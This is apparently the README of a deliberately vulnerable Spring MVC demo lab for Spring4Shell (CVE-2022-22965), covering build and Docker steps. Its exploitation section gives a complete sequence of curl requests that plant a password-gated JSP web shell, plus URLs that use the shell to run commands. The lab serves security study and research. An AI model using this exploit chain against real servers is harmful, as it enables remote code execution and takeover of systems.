# Spring4Shell Demo

This repository contains a simple Spring MVC application that is vulnerable to the **Spring4Shell RCE vulnerability (CVE-2022-22965)**.

This project is for **educational and research purposes only**. Please do not use this code in a production environment.

-----

## What is Spring4Shell?

Spring4Shell is a critical **remote code execution (RCE)** vulnerability in the Spring Framework. The vulnerability was discovered in March 2022 and affects **Spring Core on JDK 9+**. Specifically, it leverages a weakness in the way Spring handles data binding from HTTP requests to Java objects. By sending a specially crafted HTTP request, an attacker can write a malicious JSP file to the web root, which can then be used to execute arbitrary commands on the server.

-----

## Prerequisites

  * Java 9+
  * Maven
  * Docker

-----

## Building and Running the Application

1.  **Build the project using Maven:**

    ```bash
    mvn clean package
    ```

    This will create a `springmvc5-helloworld-example-0.0.1-SNAPSHOT.war` file in the `target` directory.

2.  **Build the Docker image:**

    ```bash
    docker build -t spring4shell-demo .
    ```

3.  **Run the Docker container:**

    ```bash
    docker run -p 8080:8080 spring4shell-demo
    ```

The application will be accessible at `http://localhost:8080/springmvc5-helloworld-example-0.0.1-SNAPSHOT/`.

-----

## Exploitation

The following `curl` command can be used to exploit the vulnerability. This will create a file named `shell.jsp` in the webapp root, which can then be used to execute arbitrary commands.

```bash
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di' \
'http://localhost:8080/springmvc5-helloworld-example-0.0.1-SNAPSHOT/helloworld'

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
'http://localhost:8080/springmvc5-helloworld-example-0.0.1-SNAPSHOT/helloworld'

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT' \
'http://localhost:8080/springmvc5-helloworld-example-0.0.1-SNAPSHOT/helloworld'

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell' \
'http://localhost:8080/springmvc5-helloworld-example-0.0.1-SNAPSHOT/helloworld'

curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
'http://localhost:8080/springmvc5-helloworld-example-0.0.1-SNAPSHOT/helloworld'
```

After running these commands, you can execute commands by visiting the following URL in your browser:

`http://localhost:8080/shell.jsp?pwd=j&cmd=<your_command>`

For example, to list the files in the current directory:

`http://localhost:8080/shell.jsp?pwd=j&cmd=ls`

-----

## Disclaimer

This code is for **educational and research purposes only**. The author is not responsible for any misuse of this code.
